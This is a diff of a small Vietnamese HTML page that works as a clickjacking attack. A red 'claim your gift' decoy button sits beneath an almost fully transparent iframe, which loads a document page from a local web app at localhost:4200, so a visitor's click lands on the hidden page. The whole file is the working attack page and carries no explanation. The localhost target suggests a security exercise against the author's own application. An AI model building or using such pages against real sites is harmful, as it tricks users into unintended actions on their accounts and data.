@@ -1,28 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
+  <meta charset="UTF-8">
   <title>Trang B - Click nhận quà</title>
   <style>
+    body {
+      position: relative;
+      margin: 0;
+      padding: 20px;
+      height: 100vh;
+      background-color: #f5f5f5;
+      font-family: Arial, sans-serif;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 40px;
+      color: #333;
+    }
+
+    #fake-btn {
+      position: relative;
+      width: 100px;
+      top: 15px;
+      margin: 0 auto;
+      padding: 5px 30px;
+      background-color: crimson;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      border-radius: 8px;
+      cursor: pointer;
+      z-index: 1;
+    }
+
     iframe {
       position: absolute;
-      width: 300px;
-      height: 200px;
+      top: 100px;
+      left: 75px ;
+      width: 51%;
+      height: 200%;
+      border: none;
+      opacity: 0.0001; 
       z-index: 2;
-    }
-    #fake-btn {
-      position: absolute;
-      top: 50px;
-      left: 50px;
-      z-index: 1;
-      background-color: red;
-      color: white;
-      padding: 10px 20px;
+      pointer-events: auto;
     }
   </style>
 </head>
 <body>
-  <h2>Click vào nút để nhận quà!</h2>
-  <div id="fake-btn">Nhận quà ngay!</div>
-  <iframe src="http://localhost:4200/" style="width: 90%; height: 90%;"></iframe>
+  <h2>Click vào nút dưới để nhận quà cực sốc!</h2>
+  <div id="fake-btn">Nhận</div>
+  <iframe src="http://localhost:4200/document/680ef19c9172f121c7471455"></iframe>
 </body>
 </html>
